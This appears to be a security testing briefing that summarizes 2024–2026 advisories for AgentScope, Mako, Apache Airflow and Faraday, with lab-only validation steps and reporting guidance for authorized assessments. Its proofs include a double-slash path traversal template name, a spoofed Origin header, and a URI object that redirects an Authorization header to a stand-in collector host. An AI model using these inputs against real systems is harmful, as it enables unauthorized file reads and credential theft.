# AgentScope, Mako, Airflow, and Faraday boundary batch

Source: GitHub Security Advisories REST API, updated 2026-06-05.

This batch is durable because the advisories map to reusable offensive testing patterns: **agent-studio file endpoints crossing into host file reads**, **template lookup normalization mismatches crossing into arbitrary file reads**, **orchestrator task logs crossing into backend credential exposure**, and **fixed-base HTTP clients crossing into attacker-controlled hosts while carrying scoped headers**. Use the workflows only in authorized labs or explicitly scoped assessments.

## What changed

- **AgentScope Studio file-read boundaries** — [GHSA-f4hc-q562-cc5r](https://github.com/advisories/GHSA-f4hc-q562-cc5r) / CVE-2024-8438, [GHSA-6v28-q95m-93qr](https://github.com/advisories/GHSA-6v28-q95m-93qr) / CVE-2024-8524, [GHSA-p6h7-hfj2-vmcf](https://github.com/advisories/GHSA-p6h7-hfj2-vmcf) / CVE-2024-8501, and [GHSA-75v5-6885-59f9](https://github.com/advisories/GHSA-75v5-6885-59f9) / CVE-2024-8487: AgentScope `0.0.4` exposed API surfaces where `/api/file`, `/read-examples`, and `rpc_agent_client.download_file` could read local files, while permissive CORS could let a browser origin drive API calls. Treat exposed AgentScope Studio/RPC services as agent-control-plane targets, especially when demos, notebooks, or internal model-evaluation stacks are internet reachable.
- **Mako `TemplateLookup.get_template()` double-slash traversal** — [GHSA-v92g-xgxw-vvmm](https://github.com/advisories/GHSA-v92g-xgxw-vvmm) / CVE-2026-41205: Mako before `1.3.11` could resolve `//../../../secret.txt`-style template URIs inconsistently. `TemplateLookup.get_template()` stripped all leading slashes before lookup, while `Template.__init__` stripped only one slash before the traversal check, allowing arbitrary files readable by the process to be returned as rendered template content when untrusted input reaches template lookup. The advisory notes Python `BaseHTTPRequestHandler` normalizes double-slash prefixes, so prioritize non-normalizing routers or direct API-level template names.
- **Apache Airflow task-log credential leakage** — [GHSA-g3jr-4jrm-jvqv](https://github.com/advisories/GHSA-g3jr-4jrm-jvqv) / CVE-2026-41018 and [GHSA-xccp-97wp-3gjg](https://github.com/advisories/GHSA-xccp-97wp-3gjg) / CVE-2026-43826: Airflow Elasticsearch and OpenSearch logging providers wrote full backend `host` URLs into task logs when credentials were embedded in the URL. Any principal with task-log read permission could harvest those backend credentials.
- **Faraday protocol-relative URI object host-scope bypass** — [GHSA-5rv5-xj5j-3484](https://github.com/advisories/GHSA-5rv5-xj5j-3484) / CVE-2026-33637: `Faraday::Connection#build_exclusive_url` could still accept a protocol-relative host override when the request target was supplied as a `URI` object instead of a string. A request that developers believed was pinned to a fixed-base `Faraday::Connection` could be redirected to an attacker-controlled host while preserving connection-scoped headers such as `Authorization`.

## Operator triage

1. Search asset inventories for AgentScope Studio, demo notebooks, model-evaluation services, or RPC agent clients. Prioritize hosts exposing `/api/file`, `/read-examples`, static Studio UI routes, or RPC endpoints without an upstream access gateway.
2. For AgentScope, capture package version, exposed route, authentication boundary, CORS behavior, and whether the service runs near model artifacts, API keys, notebooks, or mounted workspaces.
3. Search Python web/template code for Mako `TemplateLookup.get_template()` calls where a route parameter, query value, file name, theme name, tenant template name, or CMS path flows into the URI argument.
4. For Mako, capture package version, lookup directories, the web server/router in front of the lookup, and whether that stack preserves or normalizes leading double slashes before application code sees the value.
5. Search Airflow environments for Elasticsearch/OpenSearch remote task logging with `user:password@host` style backend URLs. Prioritize roles that can read task logs but should not access logging-backend credentials.
6. Search Ruby services for Faraday clients that combine a fixed `Faraday.new(url: ...)` base, connection-level auth headers, and user-influenced request targets converted into `URI` objects. Prioritize webhook fetchers, API proxy clients, importers, OAuth/JWKS fetchers, and callback validators.

## Replayable validation boundaries

### AgentScope host file-read proof

Keep validation to a disposable AgentScope lab or an explicitly approved non-production instance. Use an inert marker file, not system secrets.

1. Create a marker file such as `/tmp/skillz-agentscope-marker.json` containing a unique string.
2. Exercise the same file-read surface exposed by the target, for example `/api/file` with a `path` value or `/read-examples` with a traversal sequence that resolves to the marker file.
3. If testing `rpc_agent_client.download_file`, request only the marker file path from a lab RPC agent host.
4. Vulnerable result: the API returns the marker content from outside the intended examples/workspace directory.
5. Capture request, response status/body excerpt, package version, route exposure, and process working directory. Do not request `/etc/passwd`, cloud metadata, SSH keys, model credentials, or production notebooks.

### AgentScope CORS assist check

1. Send a preflight or simple request with a controlled `Origin: https://skillz.invalid` header to the exposed AgentScope API.
2. Vulnerable result: the service reflects or broadly allows the untrusted origin and permits credentials or sensitive API reads.
3. Treat CORS as an exploit amplifier only when the browser-accessible API also has useful authenticated state, local-network reachability, or file-read actions.

### Mako double-slash lookup proof

Use a lab route that passes a template name directly to `TemplateLookup.get_template()`.

1. Put `safe.html` inside the configured template directory and put `/tmp/skillz-mako-marker.txt` outside it.
2. Request the legitimate template name to establish the baseline.
3. Request a double-leading-slash traversal URI that would resolve from the template directory to the marker file, for example `//../../../../tmp/skillz-mako-marker.txt` adjusted for the lab path depth.
4. Vulnerable result: Mako returns/renders the marker file even though it is outside the lookup directory.
5. Capture the exact URI as seen by application code, Mako version, lookup directories, router/server normalization behavior, and marker-only output.

### Airflow task-log secret proof

Do not harvest real credentials. Reproduce with a canary backend URL in a scoped lab DAG.

1. Configure a lab Airflow environment with affected `apache-airflow-providers-elasticsearch` or `apache-airflow-providers-opensearch` versions and a fake host URL such as `https://skillz_user:skillz_canary_password@logs.example.invalid:9200`.
2. Trigger a no-op DAG that writes remote task logs through the configured provider.
3. Read the task log using a role equivalent to the target's log-reader role.
4. Vulnerable result: the full backend URL, including `skillz_canary_password`, appears in task logs.
5. Capture provider package/version, logging config shape, role used for log read, and canary-string evidence. Do not expose or copy production logging-backend credentials.

### Faraday fixed-host header-leak proof

Use two lab endpoints: an intended fixed-base API and a canary receiver you control.

1. Build a minimal Ruby harness that creates `Faraday.new(url: "https://intended.example.invalid")` with a canary `Authorization: Bearer skillz-canary` header.
2. Exercise the target's request-building path with a protocol-relative URI object such as `URI("//canary.example.invalid/collect")`, matching the advisory's object-vs-string distinction.
3. Vulnerable result: the request is sent to the canary host and includes the connection-scoped authorization header.
4. Capture Faraday version, whether the input was a `URI` object, the resolved outbound host, and the canary header arrival. Do not send real service tokens to third-party hosts.

## Reporting heuristics

- Frame AgentScope findings as **agent-control-plane file-read and browser-origin boundary** issues. Include the route, version, auth state, process context, and marker-only file path returned.
- For AgentScope, distinguish unauthenticated internet exposure from authenticated internal-console exposure; the exploitability and blast radius differ.
- Frame Mako findings as a **path normalization disagreement in template lookup**. Report only when untrusted input can reach `TemplateLookup.get_template()` and the server/router preserves the double-leading-slash primitive.
- Frame Airflow findings as **task-log reader to backend-secret boundary** issues. Prove with canary credentials and document the least-privileged role that can read the leaked value.
- Frame Faraday findings as a **fixed-base client host-scope bypass**. Include the object type (`URI` vs string), base URL, connection-level headers present, and controlled canary evidence.
- Keep proofs non-destructive and scoped. Do not retrieve real secrets, production files, or unrelated task logs.

## Sources

- GitHub Advisory Database: [GHSA-f4hc-q562-cc5r / CVE-2024-8438](https://github.com/advisories/GHSA-f4hc-q562-cc5r)
- GitHub Advisory Database: [GHSA-6v28-q95m-93qr / CVE-2024-8524](https://github.com/advisories/GHSA-6v28-q95m-93qr)
- GitHub Advisory Database: [GHSA-p6h7-hfj2-vmcf / CVE-2024-8501](https://github.com/advisories/GHSA-p6h7-hfj2-vmcf)
- GitHub Advisory Database: [GHSA-75v5-6885-59f9 / CVE-2024-8487](https://github.com/advisories/GHSA-75v5-6885-59f9)
- GitHub Advisory Database: [GHSA-v92g-xgxw-vvmm / CVE-2026-41205](https://github.com/advisories/GHSA-v92g-xgxw-vvmm)
- Mako upstream advisory: [sqlalchemy/mako GHSA-v92g-xgxw-vvmm](https://github.com/sqlalchemy/mako/security/advisories/GHSA-v92g-xgxw-vvmm)
- GitHub Advisory Database: [GHSA-g3jr-4jrm-jvqv / CVE-2026-41018](https://github.com/advisories/GHSA-g3jr-4jrm-jvqv)
- GitHub Advisory Database: [GHSA-xccp-97wp-3gjg / CVE-2026-43826](https://github.com/advisories/GHSA-xccp-97wp-3gjg)
- GitHub Advisory Database: [GHSA-5rv5-xj5j-3484 / CVE-2026-33637](https://github.com/advisories/GHSA-5rv5-xj5j-3484)
- Faraday upstream advisory: [lostisland/faraday GHSA-5rv5-xj5j-3484](https://github.com/lostisland/faraday/security/advisories/GHSA-5rv5-xj5j-3484)
